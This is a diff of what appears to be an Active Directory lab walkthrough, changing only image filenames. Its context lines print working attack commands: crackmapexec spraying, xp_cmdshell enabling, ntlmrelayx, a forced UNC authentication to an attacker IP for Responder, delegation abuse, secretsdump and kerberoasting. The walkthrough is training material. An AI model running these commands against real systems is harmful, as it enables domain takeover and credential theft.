@@ -91,7 +91,7 @@ git clone https://github.com/fox-it/BloodHound.py
 bloodhound-python -d amsterdam.bank.local -ns 10.0.0.3 -dc DC02.amsterdam.bank.local -u 'Richard' -p 'Sample123' --zip -c all
 ```
 
-![](<../../../.gitbook/assets/image (2) (1).png>)
+![](<../../../.gitbook/assets/image (2) (1) (1).png>)
 
 2\. We now can load the data into BloodHound by dragging the zip file into the BloodHound program and see if `Richard` can do anything useful. In the top search for the Richard user and click on it.
 
@@ -151,7 +151,7 @@ crackmapexec winrm 10.0.0.0/24 -u richard -p Sample123
 crackmapexec mssql 10.0.0.0/24 -u richard -p Sample123
 ```
 
-![](<../../../.gitbook/assets/image (15) (1) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1) (1) (2).png>)
 
 Richard can connect to the SQL server running on `WEB01` `10.0.0.5`. But he doesn't have sysadmin rights(otherwise the tool prints Pwn3d!).
 
@@ -284,7 +284,7 @@ EXEC sp_configure 'xp_cmdshell',1
 RECONFIGURE
 ```
 
-![](<../../../.gitbook/assets/image (10).png>)
+![](<../../../.gitbook/assets/image (10) (1).png>)
 
 Now we can try to execute the `whoami` command again and it worked:
 
@@ -406,7 +406,7 @@ I also did a nslookup to check if the DNS record was created. The domain control
 python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
 ```
 
-![](<../../../.gitbook/assets/image (5) (1) (1).png>)
+![](<../../../.gitbook/assets/image (5) (1) (1) (1).png>)
 
 6\. Next we need to download en load the [Change-LockScreen.ps1](https://github.com/nccgroup/Change-Lockscreen) script from the NCCgroup and load it into memory on the target:
 
@@ -444,7 +444,7 @@ export KRB5CCNAME=administrator.ccache
 secretsdump.py -k -no-pass web01.amsterdam.bank.local
 ```
 
-![](<../../../.gitbook/assets/image (1) (1).png>)
+![](<../../../.gitbook/assets/image (1) (1) (1).png>)
 
 We retrieved the hash of the local `administrator` user and the cached hashes for two domain admins. These look like NTLM hashes but aren't. We can use the local admin hash though to authenticate to `WEB01`. We can do this with our good old tool `CrackMapExec`.
 
@@ -553,7 +553,7 @@ sudo responder -I tun0
 EXEC('xp_fileexist ''\\192.168.248.2\pwn''') AT "DATA01.SECURE.LOCAL"
 ```
 
-![](<../../../.gitbook/assets/image (5) (1).png>)
+![](<../../../.gitbook/assets/image (5) (1) (1).png>)
 
 3\. If we check our Responder output we can see that we captured the hash from the user `sa_sql` from the domain `Secure`.
 
@@ -729,7 +729,7 @@ $SD.GetBinaryForm($SDBytes, 0)
 Get-DomainComputer DATA01 -Domain secure.local -Credential $creds -Server 10.0.0.100 | Set-DomainObject -Domain secure.local -Credential $creds -Server 10.0.0.100 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
 ```
 
-![](<../../../.gitbook/assets/image (15) (1).png>)
+![](<../../../.gitbook/assets/image (15) (1) (1).png>)
 
 We didn't get any output since we are in a shell. But we can check the attribute again to see of it worked:
 
@@ -760,7 +760,7 @@ export KRB5CCNAME=administrator.ccache
 secretsdump.py -k -no-pass data01.secure.local
 ```
 
-![](<../../../.gitbook/assets/image (1).png>)
+![](<../../../.gitbook/assets/image (1) (1).png>)
 
 16\. We retrieved the hash of the local administrator user. We can use the local admin hash though to authenticate to `DATA01`.&#x20;
 
@@ -933,7 +933,7 @@ secretsdump.py 'secure.local/dc03$'@dc03.secure.local -hashes aad3b435b51404eeaa
 python3 /opt/impacket/examples/GetUserSPNs.py 'secure.local/Administrator' -dc-ip 10.0.0.2 -target-domain bank.local -hashes :a59cc2e81b2835c6b402634e584a8edc -outputfile kerberoast.txt
 ```
 
-![](<../../../.gitbook/assets/image (18) (1).png>)
+![](<../../../.gitbook/assets/image (18) (1) (2).png>)
 
 2\. We retrieved one hash. Lets crack it with Hashcat.
 
@@ -955,7 +955,7 @@ We successfully cracked the password of the user `sa_admin`, the password is `We
 crackmapexec smb 10.0.0.2 10.0.0.3 -d bank.local -u sa_admin -p 'Welcome123456!'
 ```
 
-![](<../../../.gitbook/assets/image (15).png>)
+![](<../../../.gitbook/assets/image (15) (1).png>)
 
 We successfully owned all three the domains!
 
